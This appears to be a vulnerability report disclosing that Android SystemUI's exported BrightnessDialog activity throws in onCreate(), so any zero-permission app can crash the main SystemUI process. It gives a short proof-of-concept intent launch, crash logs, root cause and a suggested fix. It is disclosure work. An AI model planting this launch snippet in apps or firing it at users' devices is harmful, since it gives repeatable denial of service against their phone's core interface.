# com.android.systemui — `BrightnessDialog` Unconditional Exception Crashes the Main SystemUI Process (Zero-Permission DoS)

## Summary

`com.android.systemui.settings.brightness.BrightnessDialog` is exported with **no permission**, matching the intent-filter action `com.android.intent.action.SHOW_BRIGHTNESS_DIALOG`. Its `onCreate()` method has been left as dead legacy code that **unconditionally throws**:

```java
public void onCreate(Bundle bundle) {
    throw new IllegalStateException("Legacy code path not supported when com.android.systemui.shared.brightness_system_ui_dialog is enabled.");
}
```

Any caller that launches this activity — including a zero-permission app, since no permission or caller-identity check exists anywhere in front of it — immediately crashes it. Because this class runs in SystemUI's **main process** (no separate `android:process` override, unlike some of its siblings such as `ForegroundServicesDialog` which explicitly isolates itself into `:fgservices`), the crash brings down the entire `com.android.systemui` process: the status bar, notification shade, quick settings, lock screen chrome, and volume/brightness UI all disappear and restart.

## Severity: MEDIUM (Availability — zero-permission crash of the main SystemUI process)

- **Attack vector**: Local (malicious zero-permission app installed on device)
- **Permissions required**: ZERO
- **User interaction**: None
- **CIA impact**: Availability — a zero-permission app can force-crash and restart the entire SystemUI process on demand, at any time, with a single `startActivity()` call. This is directly user-visible (the whole shell UI drops and is torn down/relaunched) and trivially automatable/repeatable, making it a persistent, on-demand DoS/annoyance vector against a core piece of the Android UI shell — a broader blast radius than a typical single-app crash, since SystemUI backs the status bar, notifications, quick settings, and lock screen UI system-wide.

## Affected Component

- **Package**: `com.android.systemui`
- **Activity**: `com.android.systemui.settings.brightness.BrightnessDialog`

```
E: activity
    A: android:name="com.android.systemui.settings.brightness.BrightnessDialog"
    A: android:exported=true
    A: android:excludeFromRecents=true
    A: android:launchMode=3 (singleInstance)
    A: android:finishOnCloseSystemDialogs=true
    A: android:showForAllUsers=true
    (no android:permission attribute; no android:process override -- runs in SystemUI's main process)
      E: intent-filter
          E: action android:name="com.android.intent.action.SHOW_BRIGHTNESS_DIALOG"
          E: category android:name="android.intent.category.DEFAULT"
```

## Root Cause

```java
// com/android/systemui/settings/brightness/BrightnessDialog.java
public class BrightnessDialog extends ComponentActivity {
    ...
    @Override
    public final void onCreate(Bundle bundle) {
        throw new IllegalStateException("Legacy code path not supported when com.android.systemui.shared.brightness_system_ui_dialog is enabled.");
    }
    ...
}
```

This class is evidently a legacy brightness-dialog implementation superseded by a newer flag-gated replacement (`com.android.systemui.shared.brightness_system_ui_dialog`). Rather than removing the old `<activity>` declaration from the manifest (or disabling/redirecting it), its `onCreate()` was simply stubbed to throw — but the exported, no-permission manifest entry and its `SHOW_BRIGHTNESS_DIALOG` intent-filter were left fully reachable. Any caller that triggers this entry point — whether a legitimate leftover internal caller or, as demonstrated here, an arbitrary zero-permission third-party app — crashes SystemUI's main process outright, since nothing catches the `IllegalStateException` before it propagates out of `Activity.performCreate()`.

## Proof of Concept

A zero-permission app (`com.vrp.zeroperm`, no `<uses-permission>` at all) launches the activity directly:

```java
Intent i = new Intent("com.android.intent.action.SHOW_BRIGHTNESS_DIALOG");
i.setComponent(new ComponentName("com.android.systemui",
        "com.android.systemui.settings.brightness.BrightnessDialog"));
i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
startActivity(i);
```

### Dynamic result (Pixel 6a, Android 17 Beta / API 37, September 2026)

```
VRP-SysUiBrightnessCrash: startActivity() on BrightnessDialog returned normally (no SecurityException)
09-29 16:32:51.570 16190 16190 E AndroidRuntime: FATAL EXCEPTION: main
09-29 16:32:51.570 16190 16190 E AndroidRuntime: Process: com.android.systemui, PID: 16190
09-29 16:32:51.570 16190 16190 E AndroidRuntime: Caused by: java.lang.IllegalStateException: Legacy code path not supported when com.android.systemui.shared.brightness_system_ui_dialog is enabled.
09-29 16:32:51.574 16190 16190 I Process : Sending signal. PID: 16190 SIG: 9
09-29 16:32:51.623  1505  1841 I Process : Sending signal. PID: 16190 SIG: 9
```

The **main** `com.android.systemui` process (not a helper/sub-process) crashes and is subsequently SIGKILL'd by the platform. A post-crash screenshot (attached, `screenshot_after_crash_lockscreen.png`) shows the device was forced to the lock screen with a visibly disrupted status bar (missing normal carrier/notification icon layout) as SystemUI tore down and restarted.

This was first confirmed via `adb shell am start` and then independently reproduced from a genuine zero-permission installed APK (`com.vrp.zeroperm`) via `startActivity()`, with an identical crash signature (`IllegalStateException` at `BrightnessDialog.onCreate`, `com.android.systemui` process killed).

## Suggested Fix

Remove the now-dead `BrightnessDialog` `<activity>` declaration (and its `SHOW_BRIGHTNESS_DIALOG` intent-filter) from the manifest entirely now that it has been superseded by the flag-gated replacement, or at minimum gate `onCreate()` behind the same flag check used elsewhere and `finish()` gracefully instead of throwing when the legacy path is disabled.

## Environment

- **Device**: Pixel 6a
- **OS**: Android 17 Beta (API 37), security patch 2026-07-05
- **Target package**: `com.android.systemui`
- **Tested**: September 2026
